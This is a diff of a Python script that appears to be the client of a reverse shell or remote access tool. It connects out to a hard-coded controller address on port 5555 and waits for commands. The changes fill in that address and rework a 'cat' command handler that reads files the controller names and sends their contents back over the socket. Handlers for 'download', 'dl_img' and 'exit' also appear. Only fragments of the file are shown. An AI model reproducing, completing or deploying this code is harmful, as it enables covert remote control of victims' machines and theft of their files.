@@ -19,7 +19,7 @@ else:
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-socket.connect(('Your Machine IP', 5555))
+socket.connect(('192.168.100.9', 5555))
 
 while True:
 
@@ -42,6 +42,7 @@ while True:
             continue
 
         except OSError:
+            
             continue
 
     elif data[0:8] == 'download':
@@ -74,30 +75,31 @@ while True:
 
         continue
 
-    elif data[0:3] =='cat':
-
-        try:
-
-            with open(data[4:], 'rb') as f:
-
-                file = f.read()
-
-                socket.send(file)
-
-                continue
-
-        except:
-
-            socket.send('File Not Found (ERROR)'.encode('ascii'))
-
-            continue
     
     elif data == 'exit':
 
         subprocess.check_output('exit')
         
         exit()
-    
+
+    elif data[0:3] == 'cat':
+
+        try:
+
+            with open(data[4:], 'r') as f:
+
+                f = f.read()
+
+                socket.send(f.encode('ascii'))
+
+                continue
+
+        except:
+
+            socket.send('File Not Found Error'.encode('ascii'))
+
+            continue
+        
     elif data[0:6] == 'dl_img':
 
         try:
